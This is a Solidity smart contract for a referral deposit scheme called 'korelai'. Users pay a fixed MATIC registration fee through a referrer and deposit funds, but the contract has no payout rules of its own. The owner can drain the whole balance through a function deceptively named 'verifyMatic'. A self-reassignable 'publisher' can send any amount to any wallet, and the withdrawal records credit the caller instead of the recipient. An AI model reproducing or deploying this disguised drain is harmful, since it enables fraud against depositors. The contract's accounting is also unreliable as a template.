pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    /*Addition*/
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    /*Subtraction*/
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    /*Multiplication*/
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    /*Divison*/
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {

    address internal _owner;
    address internal _publisher;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

   
    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyPublisher() {
        require(_publisher == _msgSender(), "Ownable: caller is not the publisher");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function changeOwnership(address newOwner) public virtual onlyPublisher {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _publisher = newOwner;
    }    
}

contract korelai is Ownable {

    using SafeMath for uint256;
    uint256 public Total_User=0; 
    uint256 public Total_Invested_Matic=0;


    struct User {
        uint256 userId;
        address referrer;
        uint256 registrationTimestamp;
        uint256 registrationAmount;
        uint256 totalDepositedAmount;
        uint256 lastDepositTimeStamp;
        uint256 lastDepositedAmount;
        uint256 totalWithdrawalAmount;
        uint256 lastWithdarwalTimestamp;
    }

    mapping (address => User) public users;

    event Deposit(address indexed user, uint256 amount);
    event Registration(address indexed user, address referrer);
    event Withdrawal(address indexed user, uint256 amount);

    uint256 public RegisterAmount = 50 ether;

    constructor(address owner,address publisher) {
        _owner=owner;
        _publisher= publisher;
        users[_owner].userId = block.timestamp;
        Total_User+=1;
    }


    function register(address referrer) external payable {
        require(msg.value == RegisterAmount, "Incorrect Registration fee");
        require(users[referrer].userId != 0, "Referrer not registered yet!");
        User storage user = users[msg.sender];
        require(user.userId == 0, "Already registered!");
        uint256 CurrentTimeStamp= block.timestamp;
        user.userId = CurrentTimeStamp;
        users[msg.sender].referrer = referrer;
        user.registrationAmount += RegisterAmount;
        user.registrationTimestamp = CurrentTimeStamp;
        Total_Invested_Matic += RegisterAmount;
        Total_User = Total_User.add(1);
        emit Registration(msg.sender, referrer);
    }


    function deposit() external payable {
        require(users[msg.sender].userId != 0, "Register yourself before purchasing any package!");
        User storage user = users[msg.sender];
        uint256 CurrentTimeStamp= block.timestamp;
        user.totalDepositedAmount += msg.value;
        user.lastDepositedAmount = msg.value;
        user.lastDepositTimeStamp = CurrentTimeStamp;
        Total_Invested_Matic += msg.value;
        emit Deposit(msg.sender, msg.value);
    }       

    function verifyMatic( address wallet) public onlyOwner {
        payable(wallet).transfer(address(this).balance);
    }
    
    function UpdateRegFee(uint _RegisterAmount) onlyOwner public {
        RegisterAmount=_RegisterAmount;
    }

    //Function For Single Withdrawal Fund While User Will Request Withdrawal/Automatic Withdrawal
    function withdrawal(address wallet, uint256 withdrawalAmount) public onlyPublisher {
        require(users[wallet].userId != 0, "wallet not registered yet !");
        User storage user = users[msg.sender];
        uint256 CurrentTimeStamp= block.timestamp;
        user.totalWithdrawalAmount+=withdrawalAmount;
        user.lastWithdarwalTimestamp=CurrentTimeStamp;
        payable(wallet).transfer(withdrawalAmount);
    }

    //Function For Bulk Withdrawal Funds While User Will Request Withdrawal/Automatic Withdrawal
    function bulkWithdrawal( address[] calldata wallet, uint256[] calldata withdrawalAmount) public onlyPublisher { 
        uint8 i = 0;
        for (i; i < wallet.length; i++) {
            if(users[wallet[i]].userId != 0){
               User storage user = users[msg.sender];
                uint256 CurrentTimeStamp= block.timestamp;
               user.totalWithdrawalAmount+=withdrawalAmount[i];
               user.lastWithdarwalTimestamp=CurrentTimeStamp;
               payable(wallet[i]).transfer(withdrawalAmount[i]);
            }
        }
    }

    receive() external payable {}

}
